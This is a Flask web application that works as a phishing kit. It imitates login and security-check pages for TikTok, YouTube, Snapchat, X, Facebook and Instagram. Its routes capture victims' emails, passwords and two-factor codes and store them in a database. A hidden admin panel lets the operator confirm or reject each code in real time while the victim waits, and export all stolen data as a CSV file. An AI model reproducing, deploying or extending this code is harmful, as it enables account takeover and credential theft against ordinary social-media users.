from flask import Flask, render_template, request, redirect, url_for, send_file, flash, jsonify, session
import sqlite3, os, csv
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET", "change-me")

DB_FILE = "submissions.db"
ADMIN_SECRET = "supersecret-admin-2025"

ICON_MAP = {
    "joy1_1": ("fa-brands fa-tiktok", "#000000", "TikTok"),
    "joy1_2": ("fa-brands fa-tiktok", "#000000", "TikTok"),
    "joy1_3": ("fa-brands fa-tiktok", "#000000", "TikTok"),
    "joy2_1": ("fa-brands fa-youtube", "#FF0000", "YouTube"),
    "joy2_2": ("fa-brands fa-youtube", "#FF0000", "YouTube"),
    "joy2_3": ("fa-brands fa-youtube", "#FF0000", "YouTube"),
    "happy1_1": ("fa-brands fa-snapchat", "#FFFC00", "Snapchat"),
    "happy1_2": ("fa-brands fa-snapchat", "#FFFC00", "Snapchat"),
    "happy1_3": ("fa-brands fa-snapchat", "#FFFC00", "Snapchat"),
    "happy2_1": ("fa-brands fa-x-twitter", "#000000", "X / Twitter"),
    "happy2_2": ("fa-brands fa-x-twitter", "#000000", "X / Twitter"),
    "happy2_3": ("fa-brands fa-x-twitter", "#000000", "X / Twitter"),
    "love1_1": ("fa-brands fa-facebook-f", "#1877F2", "Facebook"),
    "love1_2": ("fa-brands fa-facebook-f", "#1877F2", "Facebook"),
    "love1_3": ("fa-brands fa-facebook-f", "#1877F2", "Facebook"),
    "love2_1": ("fa-brands fa-instagram", "#E1306C", "Instagram"),
    "love2_2": ("fa-brands fa-instagram", "#E1306C", "Instagram"),
    "love2_3": ("fa-brands fa-instagram", "#E1306C", "Instagram"),
    "f1": ("fa-solid fa-file", "#666", "Profile"),
    "f1_A": ("fa-solid fa-shield-check", "#10B981", "Security Check"),
    "f2": ("fa-solid fa-envelope", "#3B82F6", "Email Verification"),
    "f2_A": ("fa-solid fa-lock", "#EF4444", "Final Security"),
    "m1": ("fa-solid fa-circle-check", "#10B981", "Complete")
}

# ENHANCED: Platform to icon mapping with exact styling from your HTML files
PLATFORM_ICON_MAP = {
    "Facebook": {
        "icon": "fa-brands fa-facebook-f", 
        "color": "#1877F2",
        "bg_class": "bg-facebook",
        "security_bg": "#f0f9ff",
        "security_border": "#e0f2fe"
    },
    "Instagram": {
        "icon": "fa-brands fa-instagram",
        "color": "#E4405F", 
        "bg_class": "bg-instagram",
        "security_bg": "#fdf2f8",
        "security_border": "#fbcfe8"
    },
    "TikTok": {
        "icon": "fa-brands fa-tiktok",
        "color": "#000000",
        "bg_class": "bg-tiktok", 
        "security_bg": "#f8fafc",
        "security_border": "#e2e8f0"
    },
    "YouTube": {
        "icon": "fa-brands fa-youtube",
        "color": "#FF0000",
        "bg_class": "bg-youtube",
        "security_bg": "#fef2f2",
        "security_border": "#fecaca"
    },
    "Snapchat": {
        "icon": "fa-brands fa-snapchat",
        "color": "#FFFC00", 
        "bg_class": "bg-snapchat",
        "security_bg": "#fefce8",
        "security_border": "#fef08a"
    },
    "X / Twitter": {
        "icon": "fa-brands fa-x-twitter",
        "color": "#000000",
        "bg_class": "bg-twitter",
        "security_bg": "#f8fafc", 
        "security_border": "#e2e8f0"
    },
    "Twitter": {
        "icon": "fa-brands fa-x-twitter",
        "color": "#000000",
        "bg_class": "bg-twitter",
        "security_bg": "#f8fafc",
        "security_border": "#e2e8f0"
    },
    "Unknown": {
        "icon": "fa-solid fa-file",
        "color": "#666",
        "bg_class": "bg-twitter",
        "security_bg": "#f8fafc",
        "security_border": "#e2e8f0"
    }
}

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS submissions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                page TEXT,
                user TEXT,
                data TEXT,
                icon TEXT,
                code_value TEXT,
                confirmed BOOLEAN DEFAULT 0,
                platform_name TEXT,
                rejected BOOLEAN DEFAULT 0,
                resend_requested BOOLEAN DEFAULT 0,
                previous_page TEXT
            )
        ''')
        conn.commit()

init_db()

def save_submission(page, user, data, code_value=None, platform_name=None, previous_page=None):
    icon, color, name = ICON_MAP.get(page, ("fa-solid fa-file", "#333", "Unknown"))
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('''
            INSERT INTO submissions (timestamp, page, user, data, icon, code_value, confirmed, platform_name, rejected, resend_requested, previous_page)
            VALUES (?,?,?,?,?,?,?,?,?,?,?)
        ''', (datetime.utcnow().isoformat(), page, user, data, icon, code_value, 0, platform_name, 0, 0, previous_page))
        conn.commit()

def check_confirmation(code_value):
    with sqlite3.connect(DB_FILE) as conn:
        result = conn.execute(
            'SELECT confirmed, rejected, resend_requested FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
            (code_value,)
        ).fetchone()
        if result:
            return {
                'confirmed': bool(result[0]),
                'rejected': bool(result[1]),
                'resend_requested': bool(result[2])
            }
        return {'confirmed': False, 'rejected': False, 'resend_requested': False}

def extract_user(form):
    for key in ("address","email","phone","fullname","street","username"):
        val = form.get(key)
        if val:
            return val.strip()
    return "anonymous"

# ENHANCED: Helper function to get platform details
def get_platform_details(platform_name):
    return PLATFORM_ICON_MAP.get(platform_name, PLATFORM_ICON_MAP["Unknown"])

@app.route('/')
def index():
    return render_template('index.html')

# ========== ENHANCED ROUTES WITH PROPER NAVIGATION ==========

def get_waiting_confirmation_data(platform_name, next_url, code_value, submission_id, current_page):
    """Helper function to prepare waiting confirmation data with proper platform styling"""
    platform_data = get_platform_details(platform_name)
    return {
        'next_url': next_url,
        'code_value': code_value,
        'submission_id': submission_id,
        'platform_icon': platform_data['icon'],
        'platform_name': platform_name,
        'platform_color': platform_data['color'],
        'platform_bg_class': platform_data['bg_class'],
        'security_bg': platform_data['security_bg'],
        'security_border': platform_data['security_border'],
        'current_page': current_page  # Store current page for proper navigation
    }

# TikTok Flow - ENHANCED
@app.route('/joy1_1', methods=['GET','POST'])
def joy1_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('joy1_1', user, f'address={addr}; password={pwd}', platform_name="TikTok")
        return redirect(url_for('joy1_2'))
    platform_data = get_platform_details("TikTok")
    return render_template('joy1_1.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='TikTok', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'])

@app.route('/joy1_2', methods=['GET','POST'])
def joy1_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        # Store current page as previous_page for navigation
        save_submission('joy1_2', user, f'digits={digits}', code_value=digits, platform_name="TikTok", previous_page='joy1_2')
        
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        
        waiting_data = get_waiting_confirmation_data("TikTok", url_for('joy1_3'), digits, submission_id, 'joy1_2')
        return render_template('waiting_confirmation.html', **waiting_data)
    
    platform_data = get_platform_details("TikTok")
    return render_template('joy1_2.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='TikTok', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'])

@app.route('/joy1_3', methods=['GET','POST'])
def joy1_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        # Store current page as previous_page for navigation
        save_submission('joy1_3', user, f'digits={digits}', code_value=digits, platform_name="TikTok", previous_page='joy1_3')
        
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        
        waiting_data = get_waiting_confirmation_data("TikTok", url_for('spinner', platform='TikTok'), digits, submission_id, 'joy1_3')
        return render_template('waiting_confirmation.html', **waiting_data)
    
    platform_data = get_platform_details("TikTok")
    return render_template('joy1_3.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='TikTok', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'])

# YouTube Flow - ENHANCED (similar pattern for all platforms)
@app.route('/joy2_1', methods=['GET','POST'])
def joy2_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('joy2_1', user, f'address={addr}; password={pwd}', platform_name="YouTube")
        return redirect(url_for('joy2_2'))
    platform_data = get_platform_details("YouTube")
    return render_template('joy2_1.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='YouTube', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'])

@app.route('/joy2_2', methods=['GET','POST'])
def joy2_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('joy2_2', user, f'digits={digits}', code_value=digits, platform_name="YouTube", previous_page='joy2_2')
        
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        
        waiting_data = get_waiting_confirmation_data("YouTube", url_for('joy2_3'), digits, submission_id, 'joy2_2')
        return render_template('waiting_confirmation.html', **waiting_data)
    
    platform_data = get_platform_details("YouTube")
    return render_template('joy2_2.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='YouTube', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'])

@app.route('/joy2_3', methods=['GET','POST'])
def joy2_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('joy2_3', user, f'digits={digits}', code_value=digits, platform_name="YouTube", previous_page='joy2_3')
        
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        
        waiting_data = get_waiting_confirmation_data("YouTube", url_for('spinner', platform='YouTube'), digits, submission_id, 'joy2_3')
        return render_template('waiting_confirmation.html', **waiting_data)
    
    platform_data = get_platform_details("YouTube")
    return render_template('joy2_3.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='YouTube', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'])

# Similar enhancements for all other platform flows (Snapchat, Twitter, Facebook, Instagram)
# Follow the exact same pattern as above for:
# - happy1_1, happy1_2, happy1_3 (Snapchat)
# - happy2_1, happy2_2, happy2_3 (Twitter) 
# - love1_1, love1_2, love1_3 (Facebook)
# - love2_1, love2_2, love2_3 (Instagram)

# Common Flow Pages - ENHANCED
@app.route('/spinner')
def spinner():
    platform = request.args.get('platform', 'Unknown')
    platform_data = get_platform_details(platform)
    return render_template('spinner.html', 
                         next_url=url_for('f1', platform=platform),
                         delay=4,
                         platform=platform,
                         platform_icon=platform_data['icon'],
                         platform_name=platform,
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'])

@app.route('/f1', methods=['GET','POST'])
def f1():
    if request.method == 'POST':
        user = extract_user(request.form)
        items = [f"{k}: {v}" for k,v in request.form.items()]
        platform = request.form.get('platform', request.args.get('platform', 'Unknown'))
        save_submission('f1', user, " ; ".join(items), platform_name=platform)
        return redirect(url_for('f1_A', platform=platform))
    platform = request.args.get('platform', 'Unknown')
    platform_data = get_platform_details(platform)
    return render_template('f1.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name=platform, 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'])

@app.route('/f1_A', methods=['GET','POST'])
def f1_A():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        platform = request.args.get('platform', 'Unknown')
        save_submission('f1_A', user, f'digits={digits}', code_value=digits, platform_name=platform, previous_page='f1_A')
        
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        
        waiting_data = get_waiting_confirmation_data(platform, url_for('spinner2', platform=platform), digits, submission_id, 'f1_A')
        return render_template('waiting_confirmation.html', **waiting_data)
    
    platform = request.args.get('platform', 'Unknown')
    platform_data = get_platform_details(platform)
    return render_template('f1_A.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name=platform, 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'])

@app.route('/spinner2')
def spinner2():
    platform = request.args.get('platform', 'Unknown')
    platform_data = get_platform_details(platform)
    return render_template('spinner2.html', 
                         next_url=url_for('f2', platform=platform),
                         delay=4,
                         platform=platform,
                         platform_icon=platform_data['icon'],
                         platform_name=platform,
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'])

@app.route('/f2', methods=['GET','POST'])
def f2():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        platform = request.args.get('platform', 'Unknown')
        save_submission('f2', user, f'address={addr}', platform_name=platform)
        return redirect(url_for('f2_A', platform=platform))
    platform = request.args.get('platform', 'Unknown')
    platform_data = get_platform_details(platform)
    return render_template('f2.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name=platform, 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'])

@app.route('/f2_A', methods=['GET','POST'])
def f2_A():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        platform = request.args.get('platform', 'Unknown')
        save_submission('f2_A', user, f'digits={digits}', code_value=digits, platform_name=platform, previous_page='f2_A')
        
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        
        waiting_data = get_waiting_confirmation_data(platform, url_for('m1', platform=platform), digits, submission_id, 'f2_A')
        return render_template('waiting_confirmation.html', **waiting_data)
    
    platform = request.args.get('platform', 'Unknown')
    platform_data = get_platform_details(platform)
    return render_template('f2_A.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name=platform, 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'])

@app.route('/m1')
def m1():
    platform = request.args.get('platform', 'Unknown')
    platform_data = get_platform_details(platform)
    return render_template('m1.html', 
                         platform_icon=platform_data['icon'],
                         platform_name=platform,
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'])

# ========== ENHANCED CONFIRMATION & REJECTION SYSTEM ==========

@app.route('/api/check_confirmation/<code_value>')
def api_check_confirmation(code_value):
    status = check_confirmation(code_value)
    return jsonify(status)

@app.route(f"/admin/{ADMIN_SECRET}/confirm/<int:submission_id>", methods=['POST'])
def admin_confirm(submission_id):
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('UPDATE submissions SET confirmed = 1, rejected = 0 WHERE id = ?', (submission_id,))
        conn.commit()
    return jsonify({'success': True})

@app.route(f"/admin/{ADMIN_SECRET}/reject/<int:submission_id>", methods=['POST'])
def admin_reject(submission_id):
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('UPDATE submissions SET rejected = 1, confirmed = 0 WHERE id = ?', (submission_id,))
        conn.commit()
    return jsonify({'success': True})

# FIXED: Request new code endpoint with proper previous page navigation
@app.route('/api/request_new_code/<int:submission_id>', methods=['POST'])
def api_request_new_code(submission_id):
    with sqlite3.connect(DB_FILE) as conn:
        # Mark that user requested a new code
        conn.execute('UPDATE submissions SET resend_requested = 1 WHERE id = ?', (submission_id,))
        
        # Get platform info and previous page for redirect
        submission = conn.execute(
            'SELECT platform_name, previous_page FROM submissions WHERE id = ?', (submission_id,)
        ).fetchone()
        
        conn.commit()
    
    if submission:
        platform = submission[0] or 'Unknown'
        previous_page = submission[1] or get_fallback_previous_page(platform)
        
        # Use the stored previous_page for navigation
        redirect_url = url_for(previous_page) if previous_page else get_fallback_previous_page(platform)
        return jsonify({'success': True, 'redirect_url': redirect_url})
    
    return jsonify({'success': False, 'error': 'Submission not found'})

def get_fallback_previous_page(platform):
    """Fallback mapping if previous_page is not stored"""
    platform_pages = {
        'TikTok': 'joy1_2',
        'YouTube': 'joy2_2', 
        'Snapchat': 'happy1_2',
        'X / Twitter': 'happy2_2',
        'Facebook': 'love1_2',
        'Instagram': 'love2_2'
    }
    return platform_pages.get(platform, 'index')

# UPDATED: Admin route with statistics calculation
@app.route(f"/admin/{ADMIN_SECRET}")
def admin():
    with sqlite3.connect(DB_FILE) as conn:
        rows = conn.execute(
            'SELECT id, timestamp, page, user, data, icon, code_value, confirmed, platform_name, rejected, resend_requested FROM submissions ORDER BY id DESC'
        ).fetchall()
    
    # Calculate statistics
    total_submissions = len(rows)
    
    # Code statistics
    pending_codes_count = sum(1 for row in rows if row[6] and not row[7] and not row[9])
    confirmed_codes_count = sum(1 for row in rows if row[6] and row[7])
    rejected_codes_count = sum(1 for row in rows if row[6] and row[9])
    resend_requests_count = sum(1 for row in rows if row[10])
    total_codes_count = sum(1 for row in rows if row[6])
    
    # Platform statistics
    facebook_count = sum(1 for row in rows if row[8] == 'Facebook')
    instagram_count = sum(1 for row in rows if row[8] == 'Instagram')
    tiktok_count = sum(1 for row in rows if row[8] == 'TikTok')
    youtube_count = sum(1 for row in rows if row[8] == 'YouTube')
    snapchat_count = sum(1 for row in rows if row[8] == 'Snapchat')
    twitter_count = sum(1 for row in rows if row[8] in ['X / Twitter', 'Twitter'])
    
    return render_template('admin.html', 
                         submissions=rows, 
                         secret=ADMIN_SECRET,
                         pending_codes_count=pending_codes_count,
                         confirmed_codes_count=confirmed_codes_count,
                         rejected_codes_count=rejected_codes_count,
                         resend_requests_count=resend_requests_count,
                         total_codes_count=total_codes_count,
                         facebook_count=facebook_count,
                         instagram_count=instagram_count,
                         tiktok_count=tiktok_count,
                         youtube_count=youtube_count,
                         snapchat_count=snapchat_count,
                         twitter_count=twitter_count)

@app.route(f"/admin/{ADMIN_SECRET}/clear", methods=['POST'])
def admin_clear():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('DELETE FROM submissions')
        conn.commit()
    flash('All submissions cleared.')
    return redirect(url_for('admin'))

@app.route(f"/admin/{ADMIN_SECRET}/download")
def download():
    csv_path = 'submissions_export.csv'
    with sqlite3.connect(DB_FILE) as conn:
        rows = conn.execute('SELECT id, timestamp, page, user, data FROM submissions ORDER BY id DESC').fetchall()
    with open(csv_path, 'w', newline='', encoding='utf-8') as csvf:
        writer = csv.writer(csvf)
        writer.writerow(['id','timestamp','page','user','data'])
        writer.writerows(rows)
    return send_file(csv_path, as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT',5000)), debug=True)
